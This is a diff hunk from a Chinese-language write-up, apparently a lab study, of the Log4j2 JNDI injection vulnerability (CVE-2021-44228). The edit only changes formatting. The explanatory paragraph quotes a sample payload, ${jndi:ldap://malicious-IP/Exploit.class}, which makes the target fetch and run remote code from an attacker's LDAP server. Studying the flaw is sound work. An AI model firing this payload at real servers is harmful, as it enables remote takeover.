@@ -242,7 +242,7 @@ at org.apache.logging.log4j.core.net.server.TcpSocketServer$SocketHandler.run(Tc
 
 Apache Log4j 2 的 2.0 到 2.14.1
 
-Log4j2框架的 Lookup 查询服务提供了动态解析`**${}**`表达式的能力，但未对解析内容进行严格限制，导致攻击者可通过构造恶意JNDI注入 payload（如`**${jndi:ldap://恶意IP/Exploit.class}**`）实现远程代码执行。当系统记录含该payload的日志时，Log4j2 会主动请求攻击者控制的 LDAP 服务，下载并执行恶意`.class`文件，最终造成服务器被完全控制（如反弹shell）。该漏洞(CVE-2021-44228)本质是Lookup 功能与 JNDI 服务的危险组合，使得日志记录这一基础功能成为攻击入口。
+Log4j2框架的 Lookup 查询服务提供了动态解析`${}`表达式的能力，但未对解析内容进行严格限制，导致攻击者可通过构造恶意JNDI注入 payload（如`${jndi:ldap://恶意IP/Exploit.class}`）实现远程代码执行。当系统记录含该payload的日志时，Log4j2 会主动请求攻击者控制的 LDAP 服务，下载并执行恶意`.class`文件，最终造成服务器被完全控制（如反弹shell）。该漏洞(CVE-2021-44228)本质是Lookup 功能与 JNDI 服务的危险组合，使得日志记录这一基础功能成为攻击入口。
 
 如果在相应协议里面都没有找到资源，就会到http服务去寻找。其次是需要注意jdk版本，我使用的是 8u20，JDK还没开启JNDI的防护。pom.xml 不需要修改，满足版本。
 
